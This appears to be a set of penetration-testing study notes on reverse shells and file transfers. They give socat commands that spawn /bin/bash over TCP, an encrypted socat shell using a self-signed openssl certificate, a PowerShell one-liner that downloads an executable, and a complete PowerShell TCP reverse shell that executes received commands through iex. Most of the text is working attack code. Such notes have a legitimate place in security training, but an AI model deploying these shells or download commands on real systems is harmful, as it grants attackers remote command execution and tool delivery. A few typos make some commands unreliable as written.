Reverse Shell
Listen on 443 with increased verbosity socat -d -d TCP4-LISTEN:443 STDOUT
Connect to box and spawn shell socat TCP4:172.16.99.20:443 EXEC:/bin/bash
---------------------------
Adding encryption
Create a self-signed certificate using OPENSSL
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 10 -out bind_shell.crt

Combine key and cert into a pem so socat can use it cat bind_shell.key vind_shell.crt > bind_shell.pem

Create encrypted listener socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0, EXEC:/bin/bash

Connect to encrpyted listener socat - OPENSSL:172.16.99.10:443,verify=0



powercat

File Transfers
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.99.10/wget.exe','C:\Users\analyst\Desktop\wget.exe')"

-c : execute the supplied command wrapped in double quotes as if it were typed on cmd line
new-object : instantiates a .NET framework or COM object. In this example the WebClient class defined in the System.Net namespace. The WebClient class contains a public method called "DownloadFile" which requires a source location and a destination.

PowerShell Reverse Shells

$client = New-Object
    System.Net.Sockets.TCPClient('172.16.99.10',443);
    
$stream = $client.GetStream();

[byte[]]$bytes = 0..65535|%{0};
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data  = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}

$client.Close();
iex : stands for INVOKE EXPRESSION
